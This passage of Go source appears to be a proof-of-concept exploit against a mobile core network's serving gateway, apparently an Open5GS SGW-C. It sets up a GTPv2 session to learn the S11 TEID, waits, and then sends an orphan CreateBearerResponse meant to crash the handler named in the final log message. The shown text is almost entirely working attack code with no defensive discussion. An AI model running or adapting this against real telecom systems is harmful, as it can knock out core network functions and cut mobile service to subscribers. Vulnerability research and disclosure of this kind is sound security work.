	sgwTEID := flag.Uint("sgw-teid", 0, "Skip CSR: use this SGW S11 TEID directly")
	bearerEbi := flag.Uint("ebi", 5, "EPS Bearer ID to place in CreateBearerResponse when using --sgw-teid")
	seq := flag.Uint("seq", 0, "Base GTPv2 sequence number for CSR (0=random)")
	cbrSeq := flag.Uint("cbr-seq", 0, "Sequence number for CreateBearerResponse (0=auto from --seq)")
	waitDur := flag.Duration("wait", 5*time.Second, "Wait before sending orphan CreateBearerResponse (let transaction timeout)")
	flag.Parse()

	if *target == "" {
		log.Fatal("Error: --target is required")
	}
	if *pgwIP == "" {
		*pgwIP = *target
	}
	if *bearerEbi > 255 {
		log.Fatalf("ebi out of range: %d", *bearerEbi)
	}

	rand.Seed(time.Now().UnixNano())

	var lp *net.UDPAddr
	var err error
	if *laddr != "" {
		lp, err = net.ResolveUDPAddr("udp", net.JoinHostPort(*laddr, "0"))
		if err != nil {
			log.Fatalf("resolve laddr: %v", err)
		}
	}

	rp, err := net.ResolveUDPAddr("udp", net.JoinHostPort(*target, fmt.Sprintf("%d", *port)))
	if err != nil {
		log.Fatalf("resolve raddr: %v", err)
	}

	conn, err := net.DialUDP("udp", lp, rp)
	if err != nil {
		log.Fatalf("dial udp: %v", err)
	}
	defer conn.Close()

	localIP := ""
	if udpAddr, ok := conn.LocalAddr().(*net.UDPAddr); ok && udpAddr.IP != nil {
		localIP = udpAddr.IP.String()
	}
	if localIP == "" {
		log.Fatal("local IP unknown (set --laddr)")
	}
	log.Printf("[*] Target %s (local %s)", rp, localIP)

	baseSeq := uint32(*seq)
	if baseSeq == 0 {
		baseSeq = rand.Uint32() & 0x00ffffff
		if baseSeq == 0 {
			baseSeq = 1
		}
	}
	mmeTeid := randNonZeroUint32(uint32(*mmeTEID))
	pgwTeid := randNonZeroUint32(uint32(*pgwTEID))

	var sgwTeid uint32
	defEbi := uint8(*bearerEbi)

	if *sgwTEID != 0 {
		sgwTeid = uint32(*sgwTEID)
		log.Printf("[*] Skipping CSR bootstrap, using SGW S11 TEID=0x%x EBI=%d", sgwTeid, defEbi)
	} else {
		log.Printf("[*] Sending CreateSessionRequest seq=0x%x mme-teid=0x%x pgw-teid=0x%x", baseSeq, mmeTeid, pgwTeid)
		csr, err := buildCSR(baseSeq, *imsi, *apn, localIP, *pgwIP, *mcc, *mnc, mmeTeid, pgwTeid)
		if err != nil {
			log.Fatalf("build CSR: %v", err)
		}

		csrBytes, err := csr.Marshal()
		if err != nil {
			log.Fatalf("marshal CSR: %v", err)
		}
		if _, err := conn.Write(csrBytes); err != nil {
			log.Fatalf("send CSR: %v", err)
		}

		var errCSR error
		sgwTeid, defEbi, errCSR = waitCSRResponse(conn)
		if errCSR != nil {
			log.Fatalf("CSR response failed: %v", errCSR)
		}
		log.Printf("[+] SGW S11 TEID=0x%x (default EBI=%d)", sgwTeid, defEbi)
	}

	if *waitDur > 0 {
		log.Printf("[*] Waiting %s before sending orphan CreateBearerResponse", *waitDur)
		time.Sleep(*waitDur)
	}

	cbrSequence := uint32(*cbrSeq)
	if cbrSequence == 0 {
		cbrSequence = baseSeq + 1
		if cbrSequence == 0 || cbrSequence > 0x00ffffff {
			cbrSequence = rand.Uint32() & 0x00ffffff
			if cbrSequence == 0 {
				cbrSequence = 1
			}
		}
	}

	if err := sendOrphanCreateBearerResponse(conn, sgwTeid, cbrSequence, defEbi); err != nil {
		log.Fatalf("send CreateBearerResponse: %v", err)
	}
	log.Println("[*] Done. Watch SGW-C for crash in sgwc_s11_handle_create_bearer_response().")
}

func sendOrphanCreateBearerResponse(conn *net.UDPConn, sgwTeid, seq uint32, ebi uint8) error {
	cause := ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil)
	bctx := ie.NewBearerContextWithinCreateBearerResponse(
		ie.NewEPSBearerID(ebi),
		ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
		nil,
		nil,
		nil,
	)

	rsp := message.NewCreateBearerResponse(
		sgwTeid, seq,
		cause,
		bctx,
	)

	b, err := rsp.Marshal()
	if err != nil {
		return fmt.Errorf("marshal CreateBearerResponse: %w", err)
	}
	if _, err := conn.Write(b); err != nil {
		return fmt.Errorf("send CreateBearerResponse: %w", err)
	}

	log.Printf("[+] Sent orphan CreateBearerResponse seq=0x%x teid=0x%x EBI=%d", seq, sgwTeid, ebi)
	return nil
}

func buildCSR(seq uint32, imsi, apn, localIP, pgwIP, mcc, mnc string, mmeTEID, pgwTEID uint32) (*message.CreateSessionRequest, error) {
	if localIP == "" || pgwIP == "" {
		return nil, fmt.Errorf("missing local or PGW IP")
	}

	senderFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS11MMEGTPC, mmeTEID, localIP, "")
	pgwFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwTEID, pgwIP, "").WithInstance(1)

	bearer := ie.NewBearerContext(
		ie.NewEPSBearerID(5),
		ie.NewBearerQoS(1, 2, 1, 9, 50000, 50000, 50000, 50000),
	)

	return message.NewCreateSessionRequest(
		0, seq,
		ie.NewIMSI(imsi),
		ie.NewMSISDN("0000000000"),
		ie.NewMobileEquipmentIdentity("353490061234560"),
		ie.NewServingNetwork(mcc, mnc),
		ie.NewRATType(gtpv2.RATTypeEUTRAN),
		ie.NewPDNType(gtpv2.PDNTypeIPv4),
		ie.NewSelectionMode(gtpv2.SelectionModeMSorNetworkProvidedAPNSubscribedVerified),
		ie.NewAccessPointName(apn),
		ie.NewAggregateMaximumBitRate(500000, 500000),
		senderFTEID,
		pgwFTEID,
		bearer,
	), nil
}

func waitCSRResponse(conn *net.UDPConn) (uint32, uint8, error) {
	buf := make([]byte, 2048)
	_ = conn.SetReadDeadline(time.Now().Add(6 * time.Second))
	n, err := conn.Read(buf)
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil {
		return 0, 0, fmt.Errorf("read CSR response: %w", err)
	}

	msg, err := message.Parse(buf[:n])
	if err != nil {
		return 0, 0, fmt.Errorf("parse CSR response: %w", err)
	}
	res, ok := msg.(*message.CreateSessionResponse)
	if !ok {
		return 0, 0, fmt.Errorf("unexpected message type %T", msg)
	}
	if res.Cause == nil {
		return 0, 0, fmt.Errorf("no Cause IE in response")
	}
	cause, err := res.Cause.Cause()
	if err != nil {
		return 0, 0, fmt.Errorf("parse Cause: %w", err)
	}
	if cause != gtpv2.CauseRequestAccepted && cause != gtpv2.CauseRequestAcceptedPartially {
		return 0, 0, fmt.Errorf("CSR rejected: cause=%d", cause)
	}
	if res.SenderFTEIDC == nil {
		return 0, 0, fmt.Errorf("no SGW S11 F-TEID in response")
	}
	sgwTeid, err := res.SenderFTEIDC.TEID()
	if err != nil {
		return 0, 0, fmt.Errorf("parse SGW TEID: %w", err)
	}

	ebi := uint8(0)
	if res.EBI != nil {
		if v, err := res.EBI.EPSBearerID(); err == nil {
			ebi = v
		}
	}
	if ebi == 0 {
		for _, b := range res.BearerContextsCreated {
			if v, err := b.EPSBearerID(); err == nil {
				ebi = v
				break
			}
		}
	}
	if ebi == 0 {
		ebi = 5
	}
	return sgwTeid, ebi, nil
}

func randNonZeroUint32(v uint32) uint32 {
	if v != 0 {
		return v
	}
	r := rand.Uint32()
	if r == 0 {
		return 1
	}
	return r
}
